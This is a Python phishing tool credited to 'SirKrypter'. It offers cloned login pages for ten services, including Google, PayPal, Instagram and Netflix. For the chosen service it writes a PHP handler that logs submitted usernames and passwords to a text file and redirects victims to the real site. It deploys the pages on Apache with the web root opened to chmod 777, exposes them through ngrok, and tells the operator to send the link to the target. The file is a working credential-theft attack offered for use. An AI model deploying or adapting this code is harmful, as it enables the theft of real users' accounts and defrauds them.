import subprocess
import time
import os
#from colorama import Fore , Style


class Program():

    def __init__(self,site):
        self.site = site

    def banner(self):
        os.system("clear")
        print("""
        
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗    +
+ ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝    +
+ ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗   +
+ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║   +
+ ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝   +
+ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝    +
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

===============================================================     
===============================================================
Creator: SirKrypter - Islamic Republic of Iran - 2020/07/30
=============================================================== 
=============================================================== 

        """)



    def create_post(self):
        try:
            subprocess.call(["chmod", "777", "/var/www/html/"])

            if number == 1:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.google.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['Email'] . ":" . $_POST['Passwd']);
                        fclose($file);
                
                ?>
                """)
                f.close()

            elif number == 2:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.github.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['login'] . ":" . $_POST['password']);
                        fclose($file);
                ?>
                """)
                f.close()

            elif number == 3:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.instagram.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['username'] . ":" . $_POST['password']);
                        fclose($file);
                ?>
                """)
                f.close()
            
            elif number == 4:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.wordpress.org');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['log'] . ":" . $_POST['pwd']);
                        fclose($file);
                ?>
                """)
                f.close()

            elif number == 5:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.us.yahoo.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['username'] . ":" . $_POST['passwd']);
                        fclose($file);
                ?>
                """)
                f.close()

            elif number == 6:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.paypal.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['login_email'] . ":" . $_POST['login_password']);
                        fclose($file);
                ?>
                """)
                f.close()

            elif number == 7:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.spotify.com/uk/');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['username'] . ":" . $_POST['password']);
                        fclose($file);
                ?>
                """)
                f.close()

            elif number == 8:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.store.steampowered.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['username'] . ":" . $_POST['password']);
                        fclose($file);
                ?>
                """)
                f.close()

            elif number == 9:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.instagram.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['username'] . ":" . $_POST['password']);
                        fclose($file);
                ?>
                """)
                f.close()

            elif number == 10:
                f = open('post.php','w+')
                f.write("""
                <?php
                        header('Location: https://www.netflix.com');
                        $file = fopen('/var/www/html/output.txt', 'a');
                        fwrite($file, $_POST['email'] . ":" . $_POST['password']);
                        fclose($file);
                ?>
                """)
                f.close()


            else:
                print("Please Check Input !")
                exit()

        except KeyboardInterrupt:
            print("Exit")
    
    def start_phishing(self):
        try:
            print("Preparing... \n")
            time.sleep(2)
            self.create_post()

            if number == 5 or number == 4 or number == 7 or number == 9 or number == 10:
                subprocess.call(["cp", "-r" , "/root/Desktop/phish/sites/"+ WebSite +"/index_files" , "/var/www/html"])
            subprocess.call(["cp", "-r" , "/root/Desktop/phish/sites/"+ WebSite +"/index.html" , "/var/www/html"])
            subprocess.call(["cp", "-r" , "/root/Desktop/phish/post.php" , "/var/www/html"])

            subprocess.call(["service" , "apache2" , "restart"])

            print("[+] Starting Phishing Attack on port 80")
            print("[+] Website: " + self.site)
            print("[*] Please Wait...")
            print("\n[+] saved : /var/www/html/index.html")
            print("[+] saved : /var/www/html/post.php")
            if number == 5 or number == 4 or number == 7 or number == 9 or number == 10:
                print("[+] saved : /var/www/html/index_files")
            print("\t\n[!] After Entering The Username And Password, Enter The Username And Password In A File Called Output In The Path : /var/www/html/output.txt\n")
            time.sleep(3)
            print("\t\n[+] After Running The Program, Give The Link To The Target\n")
            input("[+] Press Enter To Run The Program.")
            os.system("clear")
            time.sleep(5)
	    #os.system("chmod +x ngrok")
            os.system("./ngrok http 80")

        except KeyboardInterrupt:
            print("Exit")

os.system("clear")

print("""
        
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗    +
+ ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝    +
+ ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗   +
+ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║   +
+ ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝   +
+ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝    +
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

===============================================================     
===============================================================
Creator: SirKrypter - Islamic Republic of Iran - 2020/07/30
=============================================================== 
=============================================================== 


        """)

print("""
Select your desired site.
    
1  - Google
2  - Github
3  - Instagram
4  - Wordpress
5  - Yahoo
6  - Paypal
7  - Spotify
8  - Steam
9  - Instafollowers
10 - Netflix
0  - EXIT

""")

number = int(input("Your choice is >"))

if number == 1 :
    WebSite = "Google"
    Name_WebSite = "www.Google.com"

elif number == 2:
    WebSite = "Github"
    Name_WebSite = "www.Github.com"

elif number == 3:
    WebSite = "Instagram"
    Name_WebSite = "www.Instagram.com"

elif number == 4:
    WebSite = "Wordpress"
    Name_WebSite = "www.Wordpress.com"

elif number == 5:
    WebSite = "Yahoo"
    Name_WebSite = "www.us.yahoo.com"

elif number == 6:
    WebSite = "Paypal"
    Name_WebSite = "www.paypal.com"

elif number == 7:
    WebSite = "Spotify"
    Name_WebSite = "www.spotify.com"

elif number == 8:
    WebSite = "Steam"
    Name_WebSite = "www.store.steampowered.com"

elif number == 9:
    WebSite = "Instafollowers"
    Name_WebSite = "www.instagram.com"

elif number == 10:
    WebSite = "Netflix"
    Name_WebSite = "www.netflix.com"

elif number == 0:
    print("")
    print("Bye...")
    print("")
    exit()
else:
    print("Please Check The Input !")


phishing = Program(Name_WebSite)
phishing.banner()
phishing.start_phishing()

#Country:Islamic Republic of Iran 
#Creator: SirKrypter  
#Construction Time: 2020/07/30 - 2020/07/31